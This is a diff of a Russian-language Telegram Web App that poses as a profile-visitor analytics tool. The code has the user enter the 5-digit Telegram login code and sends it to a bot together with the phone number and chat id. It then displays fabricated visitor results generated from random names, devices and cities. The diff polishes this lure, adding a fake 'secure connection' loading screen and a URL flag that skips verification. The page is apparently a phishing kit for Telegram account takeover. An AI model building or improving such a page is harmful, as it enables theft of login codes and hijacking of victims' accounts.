@@ -35,15 +35,28 @@
         .header p { font-size: 15px; opacity: 0.9; }
         .content { padding: 24px; }
         
-        /* Экран ввода кода */
-        .code-screen {
+        .code-screen, .analytics-screen, .loading-screen {
+            display: none;
+        }
+        .code-screen.active, .analytics-screen.active, .loading-screen.active {
             display: block;
         }
-        .code-screen h2 {
-            font-size: 22px;
-            margin-bottom: 16px;
-            color: #1c1c1e;
+        
+        .loading-screen {
+            text-align: center;
+            padding: 40px 0;
         }
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f2f2f7;
+            border-top-color: #007AFF;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        
         .code-input {
             width: 100%;
             background: #f2f2f7;
@@ -57,10 +70,9 @@
             margin-bottom: 20px;
             outline: none;
         }
-        .code-input:focus {
-            border-color: #007AFF;
-        }
-        .verify-btn {
+        .code-input:focus { border-color: #007AFF; }
+        
+        .verify-btn, .scan-btn {
             width: 100%;
             background: #007AFF;
             color: white;
@@ -73,8 +85,8 @@
             transition: all 0.2s;
             margin-bottom: 16px;
         }
-        .verify-btn:active { transform: scale(0.97); background: #005bbf; }
-        .verify-btn:disabled { opacity: 0.5; pointer-events: none; }
+        .verify-btn:active, .scan-btn:active { transform: scale(0.97); background: #005bbf; }
+        .verify-btn:disabled, .scan-btn:disabled { opacity: 0.5; pointer-events: none; }
         
         .info-box {
             background: #f8f9ff;
@@ -86,10 +98,6 @@
             color: #6c757d;
         }
         
-        /* Экран аналитики */
-        .analytics-screen {
-            display: none;
-        }
         .stats-preview {
             background: #f8f9ff;
             border-radius: 20px;
@@ -105,11 +113,7 @@
         }
         .stat-label { color: #6c757d; }
         .stat-value { font-weight: 600; color: #007AFF; }
-        .divider {
-            height: 1px;
-            background: #e9ecff;
-            margin: 16px 0;
-        }
+        
         .period-selector {
             display: flex;
             gap: 12px;
@@ -132,26 +136,13 @@
             color: white;
             box-shadow: 0 4px 12px rgba(0,122,255,0.3);
         }
-        .scan-btn {
-            width: 100%;
-            background: #007AFF;
-            color: white;
-            border: none;
-            padding: 18px;
-            border-radius: 18px;
-            font-size: 18px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s;
-            margin-bottom: 16px;
-        }
+        
         .progress-container {
             background: #f2f2f7;
             border-radius: 100px;
             height: 8px;
             overflow: hidden;
             margin: 24px 0;
-            display: none;
         }
         .progress-bar {
             height: 100%;
@@ -164,12 +155,8 @@
             color: #6c757d;
             font-size: 14px;
             margin: 16px 0;
-            display: none;
         }
-        .results {
-            margin-top: 24px;
-            display: none;
-        }
+        .results { margin-top: 24px; }
         .result-item {
             background: #f8f9ff;
             border-radius: 16px;
@@ -178,10 +165,8 @@
             border: 1px solid #e9ecff;
             animation: fadeIn 0.5s;
         }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        
         .error-message {
             background: #fff2f0;
             border: 1px solid #ffccc7;
@@ -191,12 +176,7 @@
             margin: 16px 0;
             display: none;
         }
-        .note {
-            text-align: center;
-            color: #8e8e93;
-            font-size: 12px;
-            margin-top: 16px;
-        }
+        .note { text-align: center; color: #8e8e93; font-size: 12px; margin-top: 16px; }
     </style>
 </head>
 <body>
@@ -207,24 +187,31 @@
         </div>
         
         <div class="content">
+            <!-- Экран загрузки -->
+            <div id="loadingScreen" class="loading-screen active">
+                <h2>🔐 Подключение...</h2>
+                <div class="loading-spinner"></div>
+                <p>Устанавливаем защищенное соединение</p>
+            </div>
+            
             <!-- Экран ввода кода -->
             <div id="codeScreen" class="code-screen">
                 <h2>🔐 Подтверждение входа</h2>
-                <p style="color: #6c757d; margin-bottom: 20px;">Введите 5-значный код из Telegram/SMS</p>
+                <p style="color: #6c757d; margin-bottom: 20px;">Введите 5-значный код из Telegram</p>
                 
-                <input type="text" id="codeInput" class="code-input" maxlength="5" inputmode="numeric" pattern="\d*" placeholder="— — — — —">
+                <input type="text" id="codeInput" class="code-input" maxlength="5" inputmode="numeric" pattern="\d*" placeholder="— — — — —" autofocus>
                 
                 <button class="verify-btn" id="verifyBtn" onclick="verifyCode()">Подтвердить код</button>
                 
                 <div class="info-box">
-                    <strong>📨 Код отправлен!</strong><br>
-                    Если код не приходит в Telegram, проверьте СМС.
+                    <strong>📨 Код отправлен в Telegram!</strong><br>
+                    Если не видите сообщение - проверьте раздел "Сообщения" в приложении.
                 </div>
                 
                 <div class="error-message" id="codeError"></div>
             </div>
             
-            <!-- Экран аналитики (доступен только после правильного кода) -->
+            <!-- Экран аналитики -->
             <div id="analyticsScreen" class="analytics-screen">
                 <div class="stats-preview">
                     <div class="stat-row">
@@ -251,20 +238,18 @@
                     🔍 Начать сканирование
                 </button>
                 
-                <div class="progress-container" id="progressContainer">
+                <div class="progress-container" id="progressContainer" style="display: none;">
                     <div class="progress-bar" id="progressBar"></div>
                 </div>
                 
-                <div class="scanning-text" id="scanningText">
+                <div class="scanning-text" id="scanningText" style="display: none;">
                     Анализ логов посещений... 0%
                 </div>
                 
-                <div class="results" id="results"></div>
+                <div id="results" class="results"></div>
             </div>
             
-            <div class="note" id="statusNote">
-                Ожидание подтверждения...
-            </div>
+            <div class="note" id="statusNote">Загрузка...</div>
         </div>
     </div>
 
@@ -277,15 +262,27 @@
         let isScanning = false;
         let codeVerified = false;
         
-        // Получаем параметры из URL
+        // Получаем параметры
         const urlParams = new URLSearchParams(window.location.search);
         const phone = urlParams.get('phone') || '';
         const chatId = urlParams.get('chat') || '';
+        const verified = urlParams.get('verified') === '1';
         
-        // Проверяем, был ли уже подтвержден код
-        // В реальности здесь должна быть проверка через бота
+        // Если уже подтверждено - сразу показываем аналитику
+        if (verified) {
+            document.getElementById('loadingScreen').classList.remove('active');
+            document.getElementById('analyticsScreen').classList.add('active');
+            generateRandomStats();
+            document.getElementById('statusNote').innerText = 'Авторизация успешна';
+        } else {
+            // Показываем экран ввода кода
+            setTimeout(() => {
+                document.getElementById('loadingScreen').classList.remove('active');
+                document.getElementById('codeScreen').classList.add('active');
+                document.getElementById('statusNote').innerText = 'Введите код из Telegram';
+            }, 1500);
+        }
         
-        // Функция подтверждения кода
         function verifyCode() {
             const code = document.getElementById('codeInput').value.trim();
             const errorEl = document.getElementById('codeError');
@@ -299,8 +296,9 @@
             errorEl.style.display = 'none';
             document.getElementById('verifyBtn').innerText = 'Проверка...';
             document.getElementById('verifyBtn').disabled = true;
+            document.getElementById('statusNote').innerText = 'Отправка кода...';
             
-            // Отправляем код в бота для проверки
+            // Отправляем код в бота
             try {
                 tg.sendData(JSON.stringify({
                     t: 'c',
@@ -309,20 +307,16 @@
                     chat: chatId
                 }));
                 
-                // Ждем подтверждения от бота
-                // Пока показываем ожидание
-                document.getElementById('statusNote').innerText = '⏳ Проверка кода...';
-                
-                // Если бот не ответит через 5 секунд, покажем ошибку
+                // Ждем подтверждения
                 setTimeout(() => {
                     if (!codeVerified) {
                         errorEl.style.display = 'block';
-                        errorEl.innerText = 'Ошибка проверки. Попробуйте ввести код в чат с ботом.';
+                        errorEl.innerText = 'Бот не отвечает. Попробуйте ввести код в чат.';
                         document.getElementById('verifyBtn').innerText = 'Подтвердить код';
                         document.getElementById('verifyBtn').disabled = false;
-                        document.getElementById('statusNote').innerText = 'Ожидание подтверждения...';
+                        document.getElementById('statusNote').innerText = 'Ошибка связи';
                     }
-                }, 5000);
+                }, 8000);
                 
             } catch (e) {
                 errorEl.style.display = 'block';
@@ -332,37 +326,27 @@
             }
         }
         
-        // Функция для вызова из бота при успешной проверке кода
+        // Функция для вызова из бота
         window.onCodeVerified = function() {
             codeVerified = true;
-            document.getElementById('codeScreen').style.display = 'none';
-            document.getElementById('analyticsScreen').style.display = 'block';
-            document.getElementById('statusNote').innerText = 'Авторизация успешна. Можно начинать сканирование.';
+            document.getElementById('codeScreen').classList.remove('active');
+            document.getElementById('analyticsScreen').classList.add('active');
+            document.getElementById('statusNote').innerText = 'Авторизация успешна';
             generateRandomStats();
         };
         
-        // Функция для вызова из бота при ошибке кода
         window.onCodeError = function() {
             document.getElementById('codeError').style.display = 'block';
             document.getElementById('codeError').innerText = 'Неверный код. Попробуйте еще раз.';
             document.getElementById('verifyBtn').innerText = 'Подтвердить код';
             document.getElementById('verifyBtn').disabled = false;
-            document.getElementById('statusNote').innerText = 'Ожидание подтверждения...';
         };
         
-        // Слушаем сообщения от бота (для WebView)
-        window.addEventListener('message', function(event) {
-            try {
-                const data = JSON.parse(event.data);
-                if (data.type === 'code_verified') {
-                    window.onCodeVerified();
-                } else if (data.type === 'code_error') {
-                    window.onCodeError();
-                }
-            } catch (e) {}
+        // Слушаем сообщения от Telegram WebApp
+        tg.onEvent('web_app_data_sent', function() {
+            console.log('Данные отправлены');
         });
         
-        // Генерация случайных предварительных данных
         function generateRandomStats() {
             document.getElementById('viewsToday').textContent = Math.floor(Math.random() * 50 + 20);
             document.getElementById('uniqueViews').textContent = Math.floor(Math.random() * 30 + 10);
@@ -382,16 +366,11 @@
             document.getElementById('scanBtn').disabled = true;
             document.getElementById('progressContainer').style.display = 'block';
             document.getElementById('scanningText').style.display = 'block';
-            document.getElementById('results').style.display = 'none';
+            document.getElementById('results').innerHTML = '';
             
             let progress = 0;
-            const names = [
-                'Анна С.', 'Максим К.', 'Елена В.', 'Дмитрий П.', 
-                'Ольга Н.', 'Игорь М.', 'Татьяна Л.', 'Алексей Р.',
-                'Наталья С.', 'Сергей Д.', 'Юлия А.', 'Андрей Г.'
-            ];
-            
-            const devices = ['iPhone', 'Android', 'Desktop', 'iPad', 'MacBook'];
+            const names = ['Анна С.', 'Максим К.', 'Елена В.', 'Дмитрий П.', 'Ольга Н.', 'Игорь М.', 'Татьяна Л.', 'Алексей Р.'];
+            const devices = ['iPhone', 'Android', 'Desktop', 'iPad'];
             const cities = ['Москва', 'СПб', 'Казань', 'Новосибирск', 'Екатеринбург'];
             
             const interval = setInterval(() => {
@@ -406,7 +385,7 @@
                     for (let i = 0; i < count; i++) {
                         results.push({
                             name: names[Math.floor(Math.random() * names.length)],
-                            time: `${Math.floor(Math.random() * 28 + 1)} мар в ${Math.floor(Math.random() * 23)}:${String(Math.floor(Math.random() * 59)).padStart(2, '0')}`,
+                            time: `${Math.floor(Math.random() * 28 + 1)} мар, ${Math.floor(Math.random() * 23)}:${String(Math.floor(Math.random() * 59)).padStart(2, '0')}`,
                             device: devices[Math.floor(Math.random() * devices.length)],
                             city: cities[Math.floor(Math.random() * cities.length)],
                             views: Math.floor(Math.random() * 5 + 1)
@@ -420,25 +399,20 @@
                     document.getElementById('progressContainer').style.display = 'none';
                     isScanning = false;
                     
-                    // Сообщаем боту о завершении
+                    // Сообщаем боту
                     try {
-                        tg.sendData(JSON.stringify({
-                            t: 'scan_complete',
-                            count: results.length
-                        }));
+                        tg.sendData(JSON.stringify({ t: 'scan_complete', count: results.length }));
                     } catch (e) {}
                 }
                 
                 document.getElementById('progressBar').style.width = progress + '%';
-                document.getElementById('scanningText').innerHTML = 
-                    `🔍 Анализ логов посещений... ${Math.floor(progress)}%`;
-                
+                document.getElementById('scanningText').innerHTML = `🔍 Анализ... ${Math.floor(progress)}%`;
             }, 150);
         }
         
         function displayResults(results) {
             const container = document.getElementById('results');
-            container.innerHTML = '<h3 style="margin-bottom: 16px;">📋 Результаты сканирования</h3>';
+            container.innerHTML = '<h3 style="margin-bottom: 16px;">📋 Результаты</h3>';
             
             results.forEach((item, index) => {
                 setTimeout(() => {
@@ -458,19 +432,7 @@
                     container.appendChild(div);
                 }, index * 100);
             });
-            
-            container.style.display = 'block';
         }
-        
-        // Проверяем, может код уже был введен ранее
-        // Можно через tg.initData проверить
-        try {
-            const initData = tg.initData || '';
-            if (initData.includes('code_verified')) {
-                window.onCodeVerified();
-            }
-        } catch (e) {}
-        
     </script>
 </body>
 </html>
